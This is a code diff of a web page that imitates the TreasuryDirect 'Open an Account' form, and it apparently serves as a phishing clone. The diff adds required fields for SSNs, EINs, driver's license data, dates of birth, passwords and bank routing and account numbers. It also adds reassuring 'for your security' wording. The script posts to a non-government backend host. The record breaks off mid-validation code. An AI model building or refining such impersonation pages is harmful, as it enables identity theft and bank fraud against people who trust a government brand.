@@ -4,7 +4,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Open an Account — TreasuryDirect</title><link rel="icon" type="image/png" href="favicon.jpg"><link rel="icon" type="image/png" href="favicon.jpg">
+  <title>Open an Account — TreasuryDirect</title>
+  <link rel="icon" type="image/png" href="favicon.jpg">
+  <link rel="icon" type="image/png" href="favicon.jpg">
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <style>
     * {
@@ -119,7 +121,6 @@
       max-width: 600px;
     }
 
-    /* Progress box, top right, like screenshot */
     .progressbox {
       text-align: center;
       font-size: 11px;
@@ -272,7 +273,7 @@
 
     .form-row {
       display: flex;
-      align-items: center;
+      align-items: flex-start;
       padding: 6px 0;
       border-bottom: 1px dotted #eee;
     }
@@ -282,6 +283,7 @@
       flex-shrink: 0;
       text-align: right;
       padding-right: 14px;
+      padding-top: 6px;
       font-size: 13px;
       color: #1b1b1b;
     }
@@ -293,15 +295,50 @@
 
     .form-row .ffield {
       flex: 1;
-      max-width: 380px;
+      max-width: 420px;
     }
 
     .form-row .ffield input,
-    .form-row .ffield select {
-      width: 100%;
+    .form-row .ffield select,
+    .form-row .ffield textarea {
       padding: 5px 7px;
       font-size: 13px;
       border: 1px solid #888;
+      border-radius: 2px;
+    }
+
+    .form-row .ffield input[type="text"],
+    .form-row .ffield input[type="email"],
+    .form-row .ffield input[type="password"],
+    .form-row .ffield input[type="date"],
+    .form-row .ffield select,
+    .form-row .ffield textarea {
+      width: 100%;
+    }
+
+    .form-row .ffield textarea {
+      resize: vertical;
+      min-height: 70px;
+    }
+
+    .form-row .ffield input.small {
+      width: 55px;
+      text-align: center;
+    }
+
+    .form-row .ffield input.medium {
+      width: 90px;
+    }
+
+    .split-fields {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      flex-wrap: wrap;
+    }
+
+    .split-fields .sep {
+      color: #666;
     }
 
     .form-row .fhint {
@@ -310,12 +347,94 @@
       margin-top: 3px;
     }
 
+    .note-red {
+      background: #fff;
+      color: #b31942;
+      font-size: 11px;
+      margin-top: 8px;
+      line-height: 1.5;
+    }
+
     .req-note {
       color: #c00;
       font-size: 12px;
       font-weight: bold;
       text-align: right;
       margin-bottom: 6px;
+    }
+
+    .type-display-box .type-display-name {
+      font-weight: bold;
+    }
+
+    .type-display-box .type-display-example {
+      color: #555;
+      font-style: italic;
+      font-size: 12px;
+      margin-top: 2px;
+    }
+
+    .tin-choice-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 6px;
+    }
+
+    .radio-line {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 6px;
+      font-size: 13px;
+    }
+
+    /* Field-level validation state */
+    .field-invalid {
+      border-color: #c00 !important;
+      background: #fdeaea !important;
+    }
+
+    .field-error-msg {
+      color: #c00;
+      font-size: 11px;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .field-error-msg.visible {
+      display: block;
+    }
+
+    .validation-summary {
+      display: none;
+      background: #fdeaea;
+      border: 2px solid #c00;
+      color: #6f1c26;
+      padding: 14px 18px;
+      margin: 16px 0;
+      font-size: 12.5px;
+      border-radius: 3px;
+    }
+
+    .validation-summary.visible {
+      display: block;
+    }
+
+    .validation-summary strong {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 13px;
+    }
+
+    .validation-summary ul {
+      margin: 6px 0 0 20px;
+    }
+
+    .validation-summary a {
+      color: #6f1c26;
+      text-decoration: underline;
+      cursor: pointer;
     }
 
     /* ===== Personalized image picker ===== */
@@ -412,6 +531,18 @@
       margin-bottom: 8px;
     }
 
+    .cert-error {
+      color: #c00;
+      font-size: 12.5px;
+      font-weight: bold;
+      margin-top: 10px;
+      display: none;
+    }
+
+    .cert-error.visible {
+      display: block;
+    }
+
     .recaptcha-row {
       margin: 18px 0;
     }
@@ -426,6 +557,7 @@
     .review-table td {
       padding: 6px 0;
       border-bottom: 1px solid #eee;
+      vertical-align: top;
     }
 
     .review-table td:first-child {
@@ -437,7 +569,7 @@
       font-weight: bold;
     }
 
-    /* ===== Buttons, blue like screenshot ===== */
+    /* ===== Buttons ===== */
     .btn-row {
       margin-top: 22px;
       display: flex;
@@ -677,94 +809,330 @@
       </div>
       <div class="req-note">* Denotes Required Fields</div>
 
+      <div class="validation-summary" id="validationSummary">
+        <strong>Please complete the following required fields before continuing:</strong>
+        <ul id="validationList"></ul>
+      </div>
+
+      <!-- ============ ENTITY-ONLY: Entity Information ============ -->
+      <div id="entitySection" style="display:none;">
+        <div class="form-section-title">Entity Information</div>
+
+        <div class="form-row">
+          <div class="flabel">Entity Account Type:</div>
+          <div class="ffield type-display-box">
+            <div class="type-display-name" id="entityTypeDisplayName">—</div>
+            <div class="type-display-example" id="entityTypeDisplayExample"></div>
+          </div>
+        </div>
+
+        <div class="form-row" id="row-entityName">
+          <div class="flabel"><span class="req">*</span>Entity Name (Registration):</div>
+          <div class="ffield">
+            <textarea id="entityName" maxlength="150"></textarea>
+            <div class="fhint">150 characters maximum</div>
+            <div class="field-error-msg" id="err-entityName">This field is required.</div>
+            <div class="note-red">
+              <strong>NOTE:</strong> The Entity Name (Registration) is used as the registration for the account and
+              must accurately reflect the legal instrument of authority. Please enter your entity or business name
+              exactly as it is legally registered so that your bank account can be verified, for your security, prior
+              to approval and usage in this system.
+            </div>
+          </div>
+        </div>
+
+        <div class="form-row">
+          <div class="flabel">Give Your Account a Name:</div>
+          <div class="ffield">
+            <input type="text" id="entityNickname" />
+            <div class="fhint">(Example: My Entity Account) — This is a personalized account name. It does NOT reflect
+              account ownership or security registration.</div>
+          </div>
+        </div>
+
+        <div class="form-row" id="row-entityTin">
+          <div class="flabel"><span class="req">*</span>Entity Taxpayer Identification Number:</div>
+          <div class="ffield">
+            <div class="field-error-msg" id="err-entityTin">Please provide either an EIN or an SSN for the entity.</div>
+            <div class="tin-choice-row">
+              <input type="radio" name="entityTinType" id="entityTinEin" value="ein" />
+              <label for="entityTinEin" class="split-fields">
+                <input type="text" class="small" maxlength="2" id="einPart1" /><span class="sep">-</span><input
+                  type="text" class="medium" maxlength="7" id="einPart2" />
+                <span style="font-size:11px;">EIN</span>
+              </label>
+            </div>
+            <div class="fhint" style="margin-bottom:8px;">
+              IRS Name Control: <input type="text" style="width:50px; display:inline-block;" maxlength="4"
+                id="einNameControl" />
+            </div>
+            <div class="tin-choice-row">
+              <input type="radio" name="entityTinType" id="entityTinSsn" value="ssn" />
+              <label for="entityTinSsn" class="split-fields">
+                <input type="text" class="small" maxlength="3" id="entitySsnPart1" /><span class="sep">-</span><input
+                  type="text" class="small" maxlength="2" id="entitySsnPart2" /><span class="sep">-</span><input
+                  type="text" class="medium" maxlength="4" id="entitySsnPart3" />
+                <span style="font-size:11px;">SSN</span>
+              </label>
+            </div>
+          </div>
+        </div>
+
+        <div class="form-row" id="row-entityAddr">
+          <div class="flabel"><span class="req">*</span>Entity Street Address:</div>
+          <div class="ffield">
+            <input type="text" id="entityAddr1" style="margin-bottom:6px;" />
+            <input type="text" id="entityAddr2" />
+            <div class="field-error-msg" id="err-entityAddr">This field is required.</div>
+          </div>
+        </div>
+        <div class="form-row" id="row-entityCity">
+          <div class="flabel"><span class="req">*</span>Entity City:</div>
+          <div class="ffield"><input type="text" id="entityCity" />
+            <div class="field-error-msg" id="err-entityCity">This field is required.</div>
+          </div>
+        </div>
+        <div class="form-row" id="row-entityState">
+          <div class="flabel"><span class="req">*</span>Entity State:</div>
+          <div class="ffield">
+            <select id="entityState">
+              <option value="">--</option>
+              <option>AL</option>
+              <option>AK</option>
+              <option>AZ</option>
+              <option>AR</option>
+              <option>CA</option>
+              <option>CO</option>
+              <option>CT</option>
+              <option>DE</option>
+              <option>FL</option>
+              <option>GA</option>
+              <option>NY</option>
+              <option>TX</option>
+              <option>WA</option>
+              <option>IL</option>
+              <option>OH</option>
+            </select>
+            <div class="field-error-msg" id="err-entityState">This field is required.</div>
+          </div>
+        </div>
+        <div class="form-row" id="row-entityZip">
+          <div class="flabel"><span class="req">*</span>Entity Zip Code:</div>
+          <div class="ffield">
+            <div class="split-fields">
+              <input type="text" class="medium" maxlength="5" id="entityZip1" /><span class="sep">-</span><input
+                type="text" class="small" maxlength="4" id="entityZip2" />
+              <span class="fhint">(Plus Four - Optional)</span>
+            </div>
+            <div class="field-error-msg" id="err-entityZip">A 5-digit zip code is required.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ============ Account Owner / Account Manager Information ============ -->
       <div class="form-section-title" id="ownerSectionTitle">Account Owner Information</div>
 
-      <div id="entityFields" style="display:none;">
-        <div class="form-row">
-          <div class="flabel"><span class="req">*</span>Entity / Trust / Estate Name:</div>
-          <div class="ffield"><input type="text" id="entityName" /></div>
+      <!-- Individual: single Full Name field -->
+      <div class="form-row" id="row-fullName">
+        <div class="flabel"><span class="req">*</span><span id="fullNameLabel">Full Name:</span></div>
+        <div class="ffield"><input type="text" id="fullName" />
+          <div class="field-error-msg" id="err-fullName">This field is required.</div>
         </div>
-        <div class="form-row">
-          <div class="flabel"><span class="req">*</span>Representative's Full Name:</div>
-          <div class="ffield"><input type="text" id="representativeName" />
-            <div class="fhint">Trustee, Executor, Administrator, or Legal Guardian</div>
+      </div>
+
+      <!-- Entity: First/Middle/Last/Suffix for the Account Manager -->
+      <div id="managerNameSection" style="display:none;">
+        <div class="form-row" id="row-mgrFirst">
+          <div class="flabel"><span class="req">*</span>First Name:</div>
+          <div class="ffield"><input type="text" id="mgrFirst" />
+            <div class="field-error-msg" id="err-mgrFirst">This field is required.</div>
           </div>
         </div>
         <div class="form-row">
+          <div class="flabel">Middle Name or Initial:</div>
+          <div class="ffield"><input type="text" id="mgrMiddle" /></div>
+        </div>
+        <div class="form-row" id="row-mgrLast">
+          <div class="flabel"><span class="req">*</span>Last Name:</div>
+          <div class="ffield"><input type="text" id="mgrLast" />
+            <div class="field-error-msg" id="err-mgrLast">This field is required.</div>
+          </div>
+        </div>
+        <div class="form-row">
+          <div class="flabel">Suffix:</div>
+          <div class="ffield">
+            <select id="mgrSuffix">
+              <option value="">--</option>
+              <option>Jr.</option>
+              <option>Sr.</option>
+              <option>II</option>
+              <option>III</option>
+              <option>IV</option>
+            </select>
+          </div>
+        </div>
+        <div class="form-row" id="row-repRole">
           <div class="flabel"><span class="req">*</span>Representative's Role:</div>
-          <div class="ffield"><input type="text" id="representativeRole" placeholder="e.g. Trustee, Executor" /></div>
+          <div class="ffield"><input type="text" id="representativeRole"
+              placeholder="e.g. Trustee, Executor, Legal Guardian" />
+            <div class="field-error-msg" id="err-repRole">This field is required.</div>
+          </div>
+        </div>
+        <div class="form-row" id="row-mgrTin">
+          <div class="flabel"><span class="req">*</span>Account Manager Taxpayer ID Number (SSN):</div>
+          <div class="ffield">
+            <div class="split-fields">
+              <input type="text" class="small" maxlength="3" id="mgrTin1" /><span class="sep">-</span><input type="text"
+                class="small" maxlength="2" id="mgrTin2" /><span class="sep">-</span><input type="text" class="medium"
+                maxlength="4" id="mgrTin3" />
+            </div>
+            <div class="field-error-msg" id="err-mgrTin">A complete SSN (XXX-XX-XXXX) is required.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-row" id="dobRow">
+        <div class="flabel"><span class="req">*</span><span id="dobLabel">Date of Birth:</span></div>
+        <div class="ffield"><input type="date" id="dateOfBirth" />
+          <div class="field-error-msg" id="err-dateOfBirth">This field is required.</div>
+        </div>
+      </div>
+
+      <div class="form-row" id="taxIdRow">
+        <div class="flabel"><span class="req">*</span><span id="taxIdLabel">Taxpayer Identification Number (SSN):</span>
+        </div>
+        <div class="ffield"><input type="text" id="taxIdNumber" placeholder="XXX-XX-XXXX" />
+          <div class="field-error-msg" id="err-taxIdNumber">This field is required.</div>
         </div>
       </div>
 
       <div class="form-row">
-        <div class="flabel"><span class="req">*</span>Full Name:</div>
-        <div class="ffield"><input type="text" id="fullName" /></div>
+        <div class="flabel">Driver's License/State ID Number:</div>
+        <div class="ffield"><input type="text" id="dlNumber" /></div>
       </div>
-      <div class="form-row" id="dobRow">
-        <div class="flabel">Date of Birth:</div>
-        <div class="ffield"><input type="date" id="dateOfBirth" /></div>
-      </div>
-      <div class="form-row" id="taxIdRow">
-        <div class="flabel" id="taxIdLabel">Taxpayer Identification Number (SSN):</div>
-        <div class="ffield"><input type="text" id="taxIdNumber" placeholder="XXX-XX-XXXX" /></div>
-      </div>
-
-      <div class="form-section-title">Contact Information</div>
-
       <div class="form-row">
+        <div class="flabel">Issuing State:</div>
+        <div class="ffield">
+          <select id="dlState">
+            <option value="">--</option>
+            <option>AL</option>
+            <option>AK</option>
+            <option>AZ</option>
+            <option>CA</option>
+            <option>NY</option>
+            <option>TX</option>
+          </select>
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="flabel">License Expiration Date:</div>
+        <div class="ffield"><input type="date" id="dlExpiration" /></div>
+      </div>
+
+      <!-- ============ Contact Information ============ -->
+      <div class="form-section-title" id="contactSectionTitle">Contact Information</div>
+
+      <div id="row-mailingAddr" style="display:none;" class="form-row">
+        <div class="flabel"><span class="req">*</span>Mailing Address:</div>
+        <div class="ffield">
+          <div class="radio-line"><input type="radio" name="mailingAddr" id="mailUseEntity" /><label
+              for="mailUseEntity">Use the Entity Address</label></div>
+          <div class="radio-line"><input type="radio" name="mailingAddr" id="mailUseManager" /><label
+              for="mailUseManager">Use a different mailing address (enter below)</label></div>
+          <div class="field-error-msg" id="err-mailingAddr">Please choose a mailing address option.</div>
+        </div>
+      </div>
+
+      <div class="form-row" id="row-email">
         <div class="flabel"><span class="req">*</span>E-mail Address:</div>
         <div class="ffield"><input type="email" id="email" />
           <div class="fhint">Your Login ID will be sent to this address</div>
+          <div class="field-error-msg" id="err-email">A valid email address is required.</div>
         </div>
       </div>
-      <div class="form-row">
+      <div class="form-row" id="row-emailRetype">
+        <div class="flabel"><span class="req">*</span>Retype E-mail Address:</div>
+        <div class="ffield"><input type="email" id="emailRetype" />
+          <div class="field-error-msg" id="err-emailRetype">Email addresses must match.</div>
+        </div>
+      </div>
+      <div class="form-row" id="row-password">
         <div class="flabel"><span class="req">*</span>Password:</div>
-        <div class="ffield"><input type="password" id="password" minlength="6" />
-          <div class="fhint">Minimum 6 characters</div>
+        <div class="ffield"><input type="password" id="password" minlength="8" />
+          <div class="fhint">Minimum 8 characters</div>
+          <div class="field-error-msg" id="err-password">Password must be at least 8 characters.</div>
         </div>
       </div>
-      <div class="form-row">
-        <div class="flabel">Phone:</div>
-        <div class="ffield"><input type="text" id="phoneNumber" placeholder="(___) ___-____" /></div>
+      <div class="form-row" id="row-phone">
+        <div class="flabel"><span class="req">*</span>Phone:</div>
+        <div class="ffield"><input type="text" id="phoneNumber" placeholder="(___) ___-____" />
+          <div class="field-error-msg" id="err-phone">This field is required.</div>
+        </div>
       </div>
-      <div class="form-row">
-        <div class="flabel">Street Address:</div>
-        <div class="ffield"><input type="text" id="street" /></div>
+      <div class="form-row" id="row-street">
+        <div class="flabel"><span class="req">*</span>Street Address:</div>
+        <div class="ffield"><input type="text" id="street" />
+          <div class="field-error-msg" id="err-street">This field is required.</div>
+        </div>
       </div>
-      <div class="form-row">
-        <div class="flabel">City:</div>
-        <div class="ffield"><input type="text" id="city" /></div>
+      <div class="form-row" id="row-city">
+        <div class="flabel"><span class="req">*</span>City:</div>
+        <div class="ffield"><input type="text" id="city" />
+          <div class="field-error-msg" id="err-city">This field is required.</div>
+        </div>
       </div>
-      <div class="form-row">
-        <div class="flabel">State:</div>
-        <div class="ffield"><input type="text" id="state" /></div>
+      <div class="form-row" id="row-state">
+        <div class="flabel"><span class="req">*</span>State:</div>
+        <div class="ffield"><input type="text" id="state" />
+          <div class="field-error-msg" id="err-state">This field is required.</div>
+        </div>
       </div>
-      <div class="form-row">
-        <div class="flabel">Zip Code:</div>
-        <div class="ffield"><input type="text" id="postalCode" /></div>
+      <div class="form-row" id="row-postalCode">
+        <div class="flabel"><span class="req">*</span>Zip Code:</div>
+        <div class="ffield"><input type="text" id="postalCode" />
+          <div class="field-error-msg" id="err-postalCode">A 5-digit zip code is required.</div>
+        </div>
       </div>
       <div class="form-row">
         <div class="flabel">Country:</div>
         <div class="ffield"><input type="text" id="country" value="United States" /></div>
       </div>
 
-      <div class="form-section-title">Bank Information</div>
+      <div class="form-section-title" id="bankSectionTitle">Bank Information</div>
 
-      <div class="form-row">
-        <div class="flabel">Bank Name:</div>
-        <div class="ffield"><input type="text" id="bankName" /></div>
+      <div class="form-row" id="row-bankName">
+        <div class="flabel"><span class="req">*</span>Bank Name:</div>
+        <div class="ffield"><input type="text" id="bankName" />
+          <div class="field-error-msg" id="err-bankName">This field is required.</div>
+        </div>
       </div>
-      <div class="form-row">
-        <div class="flabel">Routing Number:</div>
-        <div class="ffield"><input type="text" id="routingNumber" /></div>
+      <div class="form-row" id="row-routingNumber">
+        <div class="flabel"><span class="req">*</span>Routing Number:</div>
+        <div class="ffield"><input type="text" id="routingNumber" />
+          <div class="field-error-msg" id="err-routingNumber">This field is required.</div>
+        </div>
       </div>
-      <div class="form-row">
-        <div class="flabel">Account Number:</div>
-        <div class="ffield"><input type="text" id="accountNumber" /></div>
+      <div class="form-row" id="row-accountNumber">
+        <div class="flabel"><span class="req">*</span>Account Number:</div>
+        <div class="ffield"><input type="text" id="accountNumber" />
+          <div class="field-error-msg" id="err-accountNumber">This field is required.</div>
+        </div>
       </div>
-      <div class="form-row">
-        <div class="flabel">Name(s) on the Account:</div>
-        <div class="ffield"><input type="text" id="accountName" /></div>
+      <div class="form-row" id="row-accountName">
+        <div class="flabel"><span class="req">*</span>Name(s) on the Account:</div>
+        <div class="ffield"><input type="text" id="accountName" />
+          <div class="field-error-msg" id="err-accountName">This field is required.</div>
+        </div>
+      </div>
+      <div class="form-row" id="row-bankAccountType">
+        <div class="flabel"><span class="req">*</span>Account Type:</div>
+        <div class="ffield">
+          <div class="radio-line"><input type="radio" name="bankAccountType" id="acctChecking" /><label
+              for="acctChecking">Checking</label></div>
+          <div class="radio-line"><input type="radio" name="bankAccountType" id="acctSavings" /><label
+              for="acctSavings">Savings</label></div>
+          <div class="field-error-msg" id="err-bankAccountType">Please select an account type.</div>
+        </div>
       </div>
 
       <div class="form-section-title">Personalized Image &amp; Caption</div>
@@ -825,9 +1193,9 @@
         <div class="cert-body">
           <label>
             <input type="checkbox" id="certifyCheck" />
-            <span>By checking this box I certify, under penalty of perjury, that:</span>
+            <span id="certifyText">By checking this box I certify, under penalty of perjury, that:</span>
           </label>
-          <ol>
+          <ol id="certList">
             <li>The number shown on this form is my correct taxpayer identification number.</li>
             <li><strong>I am not</strong> subject to backup withholding because: (a) I am exempt from backup
               withholding, (b) I have not been notified by the Internal Revenue Service (IRS) that I am subject to
@@ -835,6 +1203,8 @@
               notified me that I am no longer subject to backup withholding.</li>
             <li>I am a U.S. person as defined by the IRS.</li>
           </ol>
+          <div class="cert-error" id="certError">You must check the certification box above before you can submit this
+            application.</div>
         </div>
       </div>
 
@@ -869,16 +1239,18 @@
   <script>
     const API_BASE = "https://t-bond-backend.onrender.com/api";
 
+    // Maps each account type to the Step 2 heading/section text and, for
+    // entity types, the label + example shown in the Entity Information box.
     const entityLabels = {
       individual: { heading: "Individual Account Application", section: "Account Owner Information" },
-      corporation: { heading: "Corporation Account Application", section: "Corporation Information" },
-      partnership: { heading: "Partnership Account Application", section: "Partnership Information" },
-      llc: { heading: "LLC Account Application", section: "LLC Information" },
-      pllc: { heading: "PLLC Account Application", section: "PLLC Information" },
-      sole_proprietorship: { heading: "Sole Proprietorship Account Application", section: "Business Information" },
-      deceased_estate: { heading: "Deceased Estate Account Application", section: "Estate Information" },
-      living_estate: { heading: "Living Estate Account Application", section: "Estate Information" },
-      trust: { heading: "Trust Account Application", section: "Trust Information" },
+      corporation: { heading: "Corporation Account Application", section: "Account Manager Information", name: "Corporation", example: "Example: ABC Corporation" },
+      partnership: { heading: "Partnership Account Application", section: "Account Manager Information", name: "Partnership", example: "Example: Smith and Jones Construction Company, a partnership" },
+      llc: { heading: "LLC Account Application", section: "Account Manager Information", name: "Limited Liability Company (LLC)", example: "Example: Summit Consulting Service, LLC" },
+      pllc: { heading: "PLLC Account Application", section: "Account Manager Information", name: "Professional Limited Liability Company (PLLC)", example: "Example: Paine Dental Associates, PLLC" },
+      sole_proprietorship: { heading: "Sole Proprietorship Account Application", section: "Account Manager Information", name: "Sole Proprietorship", example: "Example: John Doe DBA Doe Plumbing Supplies" },
+      deceased_estate: { heading: "Deceased Estate Account Application", section: "Account Manager Information", name: "Deceased Estate", example: "Examples: John Doe, Executor U/W of William Jones, deceased; John Doe, Administrator of the Estate of William Jones, deceased; John Doe, Legal Representative of the Estate of William Jones, a decedent" },
+      living_estate: { heading: "Living Estate Account Application", section: "Account Manager Information", name: "Living Estate", example: "Example: John Doe, Legal Guardian of William Jones" },
+      trust: { heading: "Trust Account Application", section: "Account Manager Information", name: "Trust", example: "Examples: John Doe, Trustee under Declaration of Trust dated January 1, 2001; Jane Doe or Sarah Jones, Trustees under Agreement with John Doe dated January 1, 2001; Sarah Jones, Trustee under the Will of John Doe, deceased" },
     };
 
     let selectedType = "individual";
@@ -947,55 +1319,181 @@
       document.getElementById("crumbLabel").textContent = crumbs[step];
       document.getElementById("pSubLabel").textContent = crumbs[step];
 
-      if (step === 2) {
-        const labels = entityLabels[selectedType];
-        document.getElementById("step2Heading").textContent = labels.heading;
-        document.getElementById("ownerSectionTitle").textContent = labels.section;
-
-        const isEntity = selectedType !== "individual";
-        document.getElementById("entityFields").style.display = isEntity ? "block" : "none";
-        document.getElementById("dobRow").style.display = isEntity ? "none" : "flex";
-        document.getElementById("taxIdLabel").textContent = isEntity
-          ? "Employer Identification Number (EIN):"
-          : "Taxpayer Identification Number (SSN):";
-      }
-
+      if (step === 2) applyStep2Layout();
       if (step === 3) buildReview();
       window.scrollTo({ top: 0, behavior: "smooth" });
     }
 
-    function validateStep2AndContinue() {
-      const fullName = document.getElementById("fullName").value.trim();
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value;
+    // Switches Step 2's visible fields/labels between the Individual layout
+    // and the Entity layout (Entity Info + Account Manager Info) based on
+    // whichever account type was picked in Step 1.
+    function applyStep2Layout() {
+      const isEntity = selectedType !== "individual";
+      const labels = entityLabels[selectedType];
 
-      if (!fullName || !email || !password) {
-        showAlert("Please complete all required fields before continuing.", "error");
-        return;
+      document.getElementById("step2Heading").textContent = labels.heading;
+      document.getElementById("entitySection").style.display = isEntity ? "block" : "none";
+      document.getElementById("managerNameSection").style.display = isEntity ? "block" : "none";
+      document.getElementById("row-fullName").style.display = isEntity ? "none" : "flex";
+      document.getElementById("row-mailingAddr").style.display = isEntity ? "flex" : "none";
+
+      document.getElementById("ownerSectionTitle").textContent = isEntity ? labels.section : "Account Owner Information";
+      document.getElementById("contactSectionTitle").textContent = isEntity ? "Account Manager Contact Information" : "Contact Information";
+      document.getElementById("bankSectionTitle").textContent = isEntity ? "Entity Bank Information" : "Bank Information";
+
+      document.getElementById("dobLabel").textContent = isEntity ? "Account Manager Date of Birth:" : "Date of Birth:";
+      document.getElementById("taxIdRow").style.display = isEntity ? "none" : "flex";
+
+      if (isEntity) {
+        document.getElementById("entityTypeDisplayName").textContent = labels.name;
+        document.getElementById("entityTypeDisplayExample").textContent = labels.example;
       }
-      if (password.length < 6) {
-        showAlert("Password must be at least 6 characters.", "error");
-        return;
+
+      const certifyText = document.getElementById("certifyText");
+      const certList = document.getElementById("certList");
+      if (isEntity) {
+        certifyText.textContent = "By checking this box I certify, under penalty of perjury, that:";
+        certList.innerHTML = `
+          <li>The numbers shown on this form for the Entity and for the Account Manager are the correct taxpayer identification numbers.</li>
+          <li><strong>The Entity is not</strong> subject to backup withholding because: (a) it is exempt from backup withholding, (b) I have not been notified by the Internal Revenue Service (IRS) that the Entity is subject to backup withholding as a result of failure to report all interest and dividends, or (c) the IRS has notified me that the Entity is no longer subject to backup withholding.</li>
+          <li>The Entity and the Account Manager are U.S. persons as defined by the IRS.</li>
+        `;
+      } else {
+        certifyText.textContent = "By checking this box I certify, under penalty of perjury, that:";
+        certList.innerHTML = `
+          <li>The number shown on this form is my correct taxpayer identification number.</li>
+          <li><strong>I am not</strong> subject to backup withholding because: (a) I am exempt from backup withholding, (b) I have not been notified by the Internal Revenue Service (IRS) that I am subject to backup withholding as a result of failure to report all interest and dividends, or (c) the IRS has notified me that I am no longer subject to backup withholding.</li>
+          <li>I am a U.S. person as defined by the IRS.</li>
+        `;
       }
-      if (selectedType !== "individual") {
-        const entityName = document.getElementById("entityName").value.trim();
-        const repName = document.getElementById("representativeName").value.trim();
-        const repRole = document.getElementById("representativeRole").value.trim();
-        if (!entityName || !repName || !repRole) {
-          showAlert("Please complete all required entity fields before continuing.", "error");
-          return;
+    }
+
+    // Copies the Entity address into the contact-address fields when the
+    // user picks "Use the Entity Address" for the mailing address.
+    document.getElementById("mailUseEntity")?.addEventListener("change", () => {
+      if (document.getElementById("mailUseEntity").checked) {
+        document.getElementById("street").value = document.getElementById("entityAddr1").value;
+        document.getElementById("city").value = document.getElementById("entityCity").value;
+        document.getElementById("state").value = document.getElementById("entityState").value;
+        document.getElementById("postalCode").value = document.getElementById("entityZip1").value;
+      }
+    });
+
+    // ---- Field-level validation helpers ----
+    function clearFieldError(inputIds, errId) {
+      inputIds.forEach((id) => document.getElementById(id)?.classList.remove("field-invalid"));
+      const errEl = document.getElementById(errId);
+      if (errEl) errEl.classList.remove("visible");
+    }
+    function setFieldError(inputIds, errId) {
+      inputIds.forEach((id) => document.getElementById(id)?.classList.add("field-invalid"));
+      const errEl = document.getElementById(errId);
+      if (errEl) errEl.classList.add("visible");
+    }
+
+    function isEinFilled() {
+      return document.getElementById("entityTinEin").checked &&
+        document.getElementById("einPart1").value.trim() &&
+        document.getElementById("einPart2").value.trim();
+    }
+    function isEntitySsnFilled() {
+      return document.getElementById("entityTinSsn").checked &&
+        document.getElementById("entitySsnPart1").value.trim() &&
+        document.getElementById("entitySsnPart2").value.trim() &&
+        document.getElementById("entitySsnPart3").value.trim();
+    }
+
+    // Builds the list of validation rules relevant to the CURRENT account
+    // type (individual vs. entity fields are only checked when visible).
+    function buildValidationRules() {
+      const isEntity = selectedType !== "individual";
+      const rules = [];
+
+      if (isEntity) {
+        rules.push(
+          ["row-entityName", "Entity Name (Registration)", () => document.getElementById("entityName").value.trim().length > 0, ["entityName"], "err-entityName"],
+          ["row-entityTin", "Entity Taxpayer Identification Number", () => isEinFilled() || isEntitySsnFilled(), ["einPart1", "einPart2", "entitySsnPart1", "entitySsnPart2", "entitySsnPart3"], "err-entityTin"],
+          ["row-entityAddr", "Entity Street Address", () => document.getElementById("entityAddr1").value.trim().length > 0, ["entityAddr1"], "err-entityAddr"],
+          ["row-entityCity", "Entity City", () => document.getElementById("entityCity").value.trim().length > 0, ["entityCity"], "err-entityCity"],
+          ["row-entityState", "Entity State", () => document.getElementById("entityState").value !== "", ["entityState"], "err-entityState"],
+          ["row-entityZip", "Entity Zip Code", () => /^\d{5}$/.test(document.getElementById("entityZip1").value.trim()), ["entityZip1"], "err-entityZip"],
+          ["row-mgrFirst", "Account Manager First Name", () => document.getElementById("mgrFirst").value.trim().length > 0, ["mgrFirst"], "err-mgrFirst"],
+          ["row-mgrLast", "Account Manager Last Name", () => document.getElementById("mgrLast").value.trim().length > 0, ["mgrLast"], "err-mgrLast"],
+          ["row-repRole", "Representative's Role", () => document.getElementById("representativeRole").value.trim().length > 0, ["representativeRole"], "err-repRole"],
+          ["row-mgrTin", "Account Manager Taxpayer ID Number", () => document.getElementById("mgrTin1").value.trim() && document.getElementById("mgrTin2").value.trim() && document.getElementById("mgrTin3").value.trim(), ["mgrTin1", "mgrTin2", "mgrTin3"], "err-mgrTin"],
+          ["row-mailingAddr", "Mailing Address", () => document.getElementById("mailUseEntity").checked || document.getElementById("mailUseManager").checked, [], "err-mailingAddr"]
+        );
+      } else {
+        rules.push(
+          ["row-fullName", "Full Name", () => document.getElementById("fullName").value.trim().length > 0, ["fullName"], "err-fullName"],
+          ["taxIdRow", "Taxpayer Identification Number", () => document.getElementById("taxIdNumber").value.trim().length > 0, ["taxIdNumber"], "err-taxIdNumber"]
+        );
+      }
+
+      rules.push(
+        ["dobRow", "Date of Birth", () => document.getElementById("dateOfBirth").value !== "", ["dateOfBirth"], "err-dateOfBirth"],
+        ["row-email", "E-mail Address", () => /^\S+@\S+\.\S+$/.test(document.getElementById("email").value.trim()), ["email"], "err-email"],
+        ["row-emailRetype", "Retype E-mail Address", () => {
+          const a = document.getElementById("email").value.trim();
+          const b = document.getElementById("emailRetype").value.trim();
+          return b.length > 0 && a === b;
+        }, ["emailRetype"], "err-emailRetype"],
+        ["row-password", "Password", () => document.getElementById("password").value.length >= 8, ["password"], "err-password"],
+        ["row-phone", "Phone", () => document.getElementById("phoneNumber").value.trim().length > 0, ["phoneNumber"], "err-phone"],
+        ["row-street", "Street Address", () => document.getElementById("street").value.trim().length > 0, ["street"], "err-street"],
+        ["row-city", "City", () => document.getElementById("city").value.trim().length > 0, ["city"], "err-city"],
+        ["row-state", "State", () => document.getElementById("state").value.trim().length > 0, ["state"], "err-state"],
+        ["row-postalCode", "Zip Code", () => /^\d{5}$/.test(document.getElementById("postalCode").value.trim()), ["postalCode"], "err-postalCode"],
+        ["row-bankName", "Bank Name", () => document.getElementById("bankName").value.trim().length > 0, ["bankName"], "err-bankName"],
+        ["row-routingNumber", "Routing Number", () => document.getElementById("routingNumber").value.trim().length > 0, ["routingNumber"], "err-routingNumber"],
